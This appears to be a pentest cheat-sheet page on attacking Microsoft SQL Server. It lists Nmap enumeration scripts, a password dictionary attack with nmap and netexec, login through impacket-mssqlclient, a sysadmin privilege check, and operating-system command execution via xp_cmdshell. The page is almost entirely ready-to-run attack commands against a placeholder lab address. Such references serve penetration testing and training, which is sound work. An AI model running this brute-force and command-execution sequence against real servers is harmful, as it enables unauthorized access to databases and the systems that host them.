---
description: Recon and pwning MSSQL Server
---

# MSSQL

### Enumerate MSSQL with Nmap

{% code overflow="wrap" %}
```bash
nmap --script ms-sql-info -p 1433 10.10.10.1
nmap -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433 10.10.10.1
# enumerate user with empty password
nmap -p 1433 --script ms-sql-empty-password 10.10.10.1
```
{% endcode %}

### Dictionary Attack

{% code overflow="wrap" %}
```bash
# nmap
nmap -p 1433 --script ms-sql-brute --script-args userdb=/opt/common_users.txt,passdb=/opt/unix_passwords.txt 10.10.10.1

# netexec
netexec mssql 10.10.10.1 -u /opt/common_users.txt -p /opt/unix_passwords.txt --local-auth --continue-on-success | grep -v "Login failed for user"
```
{% endcode %}

### Impacket-MSSQLClient

```bash
impacket-mssqlclient admin:p@ssw0rd@10.10.10.1
# check if we have 'sa' privilege
select IS_SRVROLEMEMBER ('sysadmin')
# execute command using xp_cmdshell
xp_cmdshell "whoami /priv"
```

<figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiNC_SOLTJDrgSTRUw0w-mM4S3OBn2VgbKzbqysFXxuh4DML0q9fGFrZJQQL14eKyweQoCVzRDLYW9PXF2GeCSoRAFwpNsCS97swvAQ27X_6ZpanQCbZDIjo4uJ_BH2hDMQ8VZ2loKM_uSMZ7hdFkNUhPTXeDc3J2ASqnqM6A-07nJCw8xgygxk9SEJvzI/s1068/mssql%20impacket.png" alt=""><figcaption><p>Impacket-MSSQLClient</p></figcaption></figure>

Or, use Nmap to execute xp\_cmdshell:

{% code overflow="wrap" %}
```bash
nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password='p@ssw0rd',ms-sql-xp-cmdshell.cmd="ipconfig" 10.10.10.1
```
{% endcode %}
